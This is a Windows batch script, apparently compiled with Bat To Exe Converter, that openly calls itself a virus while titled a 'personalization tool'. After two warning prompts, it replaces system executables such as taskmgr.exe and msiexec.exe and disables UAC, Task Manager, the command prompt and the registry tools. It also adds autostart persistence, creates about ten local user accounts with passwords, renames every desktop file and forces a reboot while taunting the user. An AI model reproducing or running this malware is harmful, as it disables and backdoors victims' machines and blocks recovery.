::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDBdRw2+DGK5EqAO7fvHxumIrF4hROcta4DV27iHOuVd40brFQ==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
::ZQ05rAF9IAHYFVzEqQIHIRVQQxORfEWORoUZ+vv04euLq1ccQOswds/P1buCQA==
::eg0/rx1wNQPfEVWB+kM9LVsJDDSnDliVKJQwwdLeoc+/hy0=
::fBEirQZwNQPfEVWB+kM9LVsJDDSHLni1CLQQ4fL+oc+fpy0=
::cRolqwZ3JBvQF1fEqQIALQlHQwqDMGKgA/UF5/3pr92OrEkSQ/F/Vrub07qdNOEf5kTwfJkjtg==
::dhA7uBVwLU+EWE6N+hRkaBJaT2Q=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRm34UBwPBQUbBGROXmtD7tKvKj04aq+lgx9
::Zh4grVQjdCyDJGyX8VAjFDBdRw2+GGS5E7gZ5vzo09qVrUcYV/YsRL/eyKeBLuEf41/hNd4a/1R0rJ1YRSdIewC4YQE1pWdYsyqAL8L8
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Windows NT personalization tool
echo This is a virus. Are you sure you want to run this? Make sure to test it out on a VM. [y/n]
choice /c yn /n /m ""
if errorlevel 2 (
    goto b
) else (
    goto a
)

:b
exit

:a
echo LAST WARNING! Typing y will instantly obliterate your PC/VM! ARE YOU SURE? [y/n]
choice /c yn /n /m ""
if errorlevel 2 (
    goto d
) else (
    goto c
)

:d
exit

:c
cls
echo Personalizing...
notepad sources\URDED.txt
copy URDED.txt C:\ProgramData
copy "C:\ProgramData\URDED.txt C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
takeown /F "C:\Windows\system32\taskmgr.exe"
icacls "C:\windows\system32\taskmgr.exe" /grant everyone:F
copy sources\taskmgr.exe C:\Windows\System32\taskmgr.exe /y
takeown /F "C:\Windows\system32\mmc.exe"
icacls "C:\windows\system32\mmc.exe" /grant everyone:F
copy sources\mmc.exe C:\Windows\System32\mmc.exe /y
takeown /F "C:\Windows\system32\msiexec.exe"
icacls "C:\windows\system32\msiexec.exe" /grant everyone:F
copy sources\msiexec.exe C:\Windows\System32\msiexec.exe /y
start sources\0xHAHAHA.mp3
copy sources\winntcus64.png %SystemRoot%\Web
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\Web\winntcus64.png" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
copy sources\winnt64.exe %SystemRoot%\system32
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Windows NT Personalization tool" /T REG_SZ /F /D "C:\Windows\System32\winnt64.exe"
copy sources\msg.bat "%programdata%\microsoft\windows\start menu\programs\startup"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoChangingWallpaper /t REG_DWORD /d 1 /f
reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f
net user /add NTCUS ntcus123
net user /add NTUSER ntcus124
net user /add NTDAT ntpersonalize
net user /add DC discord
net user /add cfs belgium
net user /add leopoldII belgium
net user /add SCHJIEAB rykn
net user /add IZWYOKWYIEN rykn
net user /add asap asap
net user /add REICHTANGLE ig1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v AccentColor /t REG_DWORD /d 0xFF0000 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
copy sources\txt\* %USERPROFILE%\desktop
copy sources\uap\* "C:\ProgramData\Microsoft\User Account Pictures"
cd %userprofile%\desktop
ren * *.prsnlz
cls
echo HAHAHAHA you only have 45 seconds left before it restarts!
shutdown /r /t 45
timeout /t 15 /nobreak >nul
explorer https://www.google.com/search?q=HAHAHAHAHAHA
timeout /t 15 /nobreak >nul
start https://www.google.com/search?q=russian+democratic+federative+republic
timeout /t 15 /nobreak >nul
start https://www.google.com/search?q=moskau+moskau
cls
echo HAHAHAHAHA